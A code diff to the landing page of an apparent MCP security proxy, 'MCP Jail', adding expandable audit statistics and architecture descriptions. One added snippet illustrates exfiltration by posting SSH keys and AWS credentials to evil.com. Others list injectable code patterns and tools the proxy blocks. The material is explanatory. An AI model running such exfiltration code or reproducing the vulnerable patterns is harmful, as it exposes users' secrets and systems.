@@ -85,22 +85,78 @@
 
       <p class="intro-text">We audited <strong>501 MCP servers</strong> from the official registry. The results? Terrifying. Nearly every server can steal your credentials, exfiltrate your code, or backdoor your system. And Claude Desktop gives them permission to do it.</p>
 
-      <div class="stats-grid">
-        <div class="stat-block">
-          <div class="stat-value">96.4%</div>
-          <div class="stat-label">CAN HACK YOUR MACHINE</div>
+      <div class="stats-list">
+        <div class="stat-item" data-expanded="false" onclick="toggleStat(this)">
+          <div class="stat-header">
+            <div class="stat-value">96.4%</div>
+            <div class="stat-label">CAN HACK YOUR MACHINE</div>
+            <span class="stat-toggle">+</span>
+          </div>
+          <div class="stat-details">
+            <p>Nearly all MCP servers have at least one exploitable vulnerability that could compromise your system.</p>
+            <div class="stat-code">
+              <pre># Real vulnerabilities found:
+- RCE via pickle deserialization: 351 servers
+- exec() injection: 268 servers
+- Shell command execution: 183 servers
+- Arbitrary file read/write: 380 servers</pre>
+            </div>
+          </div>
         </div>
-        <div class="stat-block">
-          <div class="stat-value">70.3%</div>
-          <div class="stat-label">CAN RUN ANY COMMAND</div>
+
+        <div class="stat-item" data-expanded="false" onclick="toggleStat(this)">
+          <div class="stat-header">
+            <div class="stat-value">70.3%</div>
+            <div class="stat-label">CAN RUN ANY COMMAND</div>
+            <span class="stat-toggle">+</span>
+          </div>
+          <div class="stat-details">
+            <p>These servers can execute arbitrary shell commands on your machine with your full user privileges.</p>
+            <div class="stat-code">
+              <pre># Example vulnerable code patterns:
+subprocess.run(user_input, shell=True)
+os.system(f"process {filename}")
+exec(user_provided_code)
+eval(user_expression)</pre>
+            </div>
+          </div>
         </div>
-        <div class="stat-block">
-          <div class="stat-value">93.4%</div>
-          <div class="stat-label">VULNERABLE TO SUPPLY CHAIN</div>
+
+        <div class="stat-item" data-expanded="false" onclick="toggleStat(this)">
+          <div class="stat-header">
+            <div class="stat-value">93.4%</div>
+            <div class="stat-label">VULNERABLE TO SUPPLY CHAIN</div>
+            <span class="stat-toggle">+</span>
+          </div>
+          <div class="stat-details">
+            <p>Unpinned dependencies mean a compromised npm/pip package automatically compromises you.</p>
+            <div class="stat-code">
+              <pre># package.json with unpinned deps:
+"dependencies": {
+  "some-package": "^1.0.0",  // Could become 1.9.9-malware
+  "another-pkg": "latest"    // Attacker publishes new "latest"
+}</pre>
+            </div>
+          </div>
         </div>
-        <div class="stat-block">
-          <div class="stat-value">75.4%</div>
-          <div class="stat-label">CAN PHONE HOME</div>
+
+        <div class="stat-item" data-expanded="false" onclick="toggleStat(this)">
+          <div class="stat-header">
+            <div class="stat-value">75.4%</div>
+            <div class="stat-label">CAN PHONE HOME</div>
+            <span class="stat-toggle">+</span>
+          </div>
+          <div class="stat-details">
+            <p>Unrestricted network access means servers can exfiltrate your data to any remote server.</p>
+            <div class="stat-code">
+              <pre># Data exfiltration is trivial:
+requests.post("https://evil.com/collect", data={
+  "ssh_key": open("~/.ssh/id_rsa").read(),
+  "aws_creds": open("~/.aws/credentials").read(),
+  "source_code": zip_entire_codebase()
+})</pre>
+            </div>
+          </div>
         </div>
       </div>
 
@@ -111,7 +167,12 @@
 
       <div class="report-download">
         <a href="MCP_SECURITY_REPORT.pdf" class="download-link">
-          <span class="download-icon">&#9744;</span>
+          <svg class="download-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+            <polyline points="14 2 14 8 20 8"></polyline>
+            <line x1="12" y1="18" x2="12" y2="12"></line>
+            <polyline points="9 15 12 18 15 15"></polyline>
+          </svg>
           <span class="download-text">
             <strong>Download Full Security Report</strong>
             <span>PDF - 501 MCP Servers Audited</span>
@@ -158,21 +219,44 @@
       <div class="divider"><div class="divider-symbol"></div></div>
 
       <h3>Architecture</h3>
+      <p>Click each component to learn more:</p>
       <div class="arch-simple">
         <!-- Flow diagram -->
         <div class="arch-flow-row">
-          <div class="arch-box-simple">
+          <div class="arch-box-simple arch-clickable" data-expanded="false" onclick="toggleArchBox(this)">
             <div class="arch-box-title">MCP Client</div>
             <div class="arch-box-sub">Claude, Cursor</div>
+            <div class="arch-box-details">
+              <p>MCP clients like Claude Desktop, Cursor, or any IDE with MCP support. They connect to MCP servers via stdio to get AI capabilities.</p>
+              <p><strong>Problem:</strong> Clients blindly trust servers and give them full system access.</p>
+            </div>
           </div>
           <div class="arch-arrow-simple">&#8594;</div>
-          <div class="arch-box-simple arch-box-accent">
+          <div class="arch-box-simple arch-box-accent arch-clickable" data-expanded="false" onclick="toggleArchBox(this)">
             <div class="arch-box-title">MCP Jail Proxy</div>
             <div class="arch-box-sub">Always active</div>
+            <div class="arch-box-details">
+              <p>Rust-based proxy that intercepts all MCP communication. Validates every request and response.</p>
+              <ul>
+                <li>Blocks dangerous tools (execute_command, eval)</li>
+                <li>Validates file paths (no ../ traversal)</li>
+                <li>Filters sensitive data from responses</li>
+                <li>Logs all operations for audit</li>
+              </ul>
+            </div>
           </div>
           <div class="arch-arrow-simple">&#8594;</div>
-          <div class="arch-box-simple arch-box-decision">
+          <div class="arch-box-simple arch-box-decision arch-clickable" data-expanded="false" onclick="toggleArchBox(this)">
             <div class="arch-box-title">Sandbox</div>
+            <div class="arch-box-sub">Auto-selected</div>
+            <div class="arch-box-details">
+              <p>Automatic sandbox selection based on availability:</p>
+              <ol>
+                <li><strong>Docker</strong> - Best isolation (if installed)</li>
+                <li><strong>macOS Sandbox</strong> - Good fallback on Mac</li>
+                <li><strong>Proxy-only</strong> - Warning shown if no sandbox</li>
+              </ol>
+            </div>
           </div>
         </div>
 
@@ -701,6 +785,16 @@ ERROR: Tool 'run_code' is blocked by policy
     }
 
     function toggleVuln(el) {
+      const expanded = el.getAttribute('data-expanded') === 'true';
+      el.setAttribute('data-expanded', !expanded);
+    }
+
+    function toggleStat(el) {
+      const expanded = el.getAttribute('data-expanded') === 'true';
+      el.setAttribute('data-expanded', !expanded);
+    }
+
+    function toggleArchBox(el) {
       const expanded = el.getAttribute('data-expanded') === 'true';
       el.setAttribute('data-expanded', !expanded);
     }
